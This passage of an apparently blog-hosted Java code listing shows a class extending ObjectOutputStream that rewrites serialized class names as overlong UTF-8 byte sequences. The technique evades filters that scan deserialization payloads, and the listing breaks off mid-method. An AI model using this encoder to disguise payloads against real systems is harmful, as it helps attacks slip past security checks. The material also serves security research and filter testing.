class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Err0r233;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å‚è€ƒpç¥ï¼šhttps://mp.weixin.qq.com/s/fcuKNfLXiFxWrIYQPq7OCg</span></span><br><span class="line"><span class="comment"> * å‚è€ƒ1ueï¼šhttps://t.zsxq.com/17LkqCzk8</span></span><br><span class="line"><span class="comment"> * å®ç°ï¼šå‚è€ƒ OObjectOutputStream# protected void writeClassDescriptor(ObjectStreamClass desc)æ–¹æ³•</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UTF8_overlong_encode</span> <span class="keyword">extends</span> <span class="title class_">ObjectOutputStream</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UTF8_overlong_encode</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(out);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> HashMap&lt;Character, <span class="type">int</span>[]&gt; map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Map&lt;Character,<span class="type">int</span>[]&gt; bytesMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&#x27;.&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc0</span>, <span class="number">0xae</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;;&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc0</span>, <span class="number">0xbb</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;$&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc0</span>, <span class="number">0xa4</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;[&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x9b</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;]&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x9d</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;a&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa1</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;b&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa2</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;c&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa3</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;d&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa4</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;e&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa5</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;f&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa6</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;g&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa7</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;h&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa8</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;i&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa9</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;j&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xaa</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;k&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xab</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;l&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xac</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;m&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xad</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;n&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xae</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;o&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xaf</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;p&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb0</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;q&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb1</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;r&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb2</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb3</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;t&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb4</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;u&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb5</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;v&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb6</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;w&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb7</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;x&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb8</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;y&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb9</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;z&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xba</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;A&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x81</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;B&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x82</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;C&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x83</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;D&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x84</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;E&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x85</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;F&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x86</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;G&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x87</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;H&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x88</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;I&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x89</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;J&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8a</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;K&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8b</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;L&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8c</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;M&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8d</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;N&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8e</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;O&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8f</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;P&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x90</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;Q&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x91</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;R&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x92</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;S&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x93</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;T&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x94</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;U&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x95</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;V&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x96</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;W&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x97</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;X&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x98</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;Y&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x99</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;Z&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x9a</span>&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        bytesMap.put(<span class="string">&#x27;$&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x80</span>,<span class="number">0xa4</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;.&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x80</span>,<span class="number">0xae</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;;&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x80</span>,<span class="number">0xbb</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;A&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x81</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;B&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x82</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;C&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x83</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;D&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x84</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;E&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x85</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;F&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x86</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;G&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x87</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;H&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x88</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;I&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x89</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;J&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x8a</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;K&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x8b</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;L&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x8c</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;M&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x8d</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;N&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x8e</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;O&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x8f</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;P&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x90</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;Q&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x91</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;R&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x92</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;S&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x93</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;T&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x94</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;U&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x95</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;V&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x96</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;W&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x97</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;X&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x98</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;Y&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x99</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;Z&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x9a</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;[&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x9b</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;]&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0x9d</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;a&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xa1</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;b&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xa2</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;c&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xa3</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;d&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xa4</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;e&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xa5</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;f&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xa6</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;g&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xa7</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;h&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xa8</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;i&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xa9</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;j&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xaa</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;k&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xab</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;l&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xac</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;m&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xad</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;n&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xae</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;o&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xaf</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;p&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xb0</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;q&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xb1</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;r&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xb2</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xb3</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;t&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xb4</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;u&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xb5</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;v&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xb6</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;w&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xb7</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;x&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xb8</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;y&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xb9</span>&#125;);</span><br><span class="line">        bytesMap.put(<span class="string">&#x27;z&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xe0</span>,<span class="number">0x81</span>,<span class="number">0xba</span>&#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">charWritTwoBytes</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="comment">//å°†nameè¿›è¡Œoverlong Encoding</span></span><br><span class="line">        <span class="type">byte</span>[] bytes=<span class="keyword">new</span> <span class="title class_">byte</span>[name.length() * <span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> k=<span class="number">0</span>;</span><br><span class="line">        StringBuffer str=<span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; name.length(); i++) &#123;</span><br><span class="line">            <span class="type">int</span>[] bs = map.get(name.charAt(i));</span><br><span class="line">            bytes[k++]= (<span class="type">byte</span>) bs[<span class="number">0</span>];</span><br><span class="line">            bytes[k++]= (<span class="type">byte</span>) bs[<span class="number">1</span>];</span><br><span class="line">            str.append(Integer.toHexString(bs[<span class="number">0</span>])+<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            str.append(Integer.toHexString(bs[<span class="number">1</span>])+<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(str.toString());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writeShort(name.length() * <span class="number">2</span>);</span><br><span class="line">            write(bytes);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">charWriteThreeBytes</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="comment">//å°†nameè¿›è¡Œoverlong Encoding</span></span><br><span class="line">        <span 